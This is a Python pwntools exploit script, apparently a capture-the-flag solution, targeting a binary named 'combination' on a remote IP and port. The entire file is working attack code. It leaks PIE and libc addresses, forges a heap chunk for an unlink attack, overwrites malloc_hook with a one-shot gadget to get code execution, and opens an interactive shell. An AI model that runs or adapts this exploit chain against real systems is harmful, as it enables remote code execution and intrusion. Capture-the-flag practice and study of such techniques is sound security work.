from pwn import *
import time

binary='./combination'
s=process('./combination')
s=remote("203.250.148.108" , 40002)
e=ELF(binary)

def rc() :
	s.recvuntil("> ")

def sl(message) :
	s.sendline(message)
rc()
sl('1') #1
sl('504')
sl('aaaaaaaa')
rc()
sl('1') #2
sl('504')
sl('b'*8)
rc()

sl('46') #3
sl('8')
sl('a'*8)
rc()
sl('3')
s.recvuntil('see? ')
sl('3')
s.recvuntil('a'*8)
leak=u64(s.recv(6).ljust(8,'\x00'))
pie=leak-0xb11
heap_ptr = pie + 0x202060
rc()
sl('46') #4
sl('72')
sl('b'*8)
rc()
sl('3')
s.recvuntil('see? ')
sl('4')
s.recvuntil('b'*8)
leak = u64(s.recv(6).ljust(8,'\x00'))
libc_base = leak - (0x7ffff7a8781b-0x7ffff7a0d000)
malloc_hook = libc_base + 0x3C4B10
free_hook = libc_base + 0x3C67A8
oneshot_gaget = libc_base + 0xF02BA-0x16
log.info('heap_ptr : '+hex(heap_ptr)+' libc_base : '+hex(libc_base)+' malloc_hook : '+hex(malloc_hook)+' oneshot_gaget : '+hex(oneshot_gaget))
rc()
sl('4')
s.recvuntil('modify : ')
sl('1')
sl(p64(0)+p64(0)+p64(heap_ptr-0x18)+p64(heap_ptr-0x10)+'a'*464+p64(0x1f0))
rc()
sl('2')
s.recvuntil('free : ')
sl('2')
time.sleep(0.5)
rc()
sl('1')
sl('152') #5
sl('')
rc()
sl('4')
s.recvuntil('modify : ')
sl('1')
sl('a'*0x18+'\xa7'+p64(malloc_hook)+'\xff\xff')
rc()
sl('4')
s.recvuntil('modify : ')
sl('5')
sl(p64(oneshot_gaget))
rc()
sl('2')
s.recvuntil('free : ')
sl('1')
s.interactive()
"""
sl('1')
sl('145')
s.interactive()
"""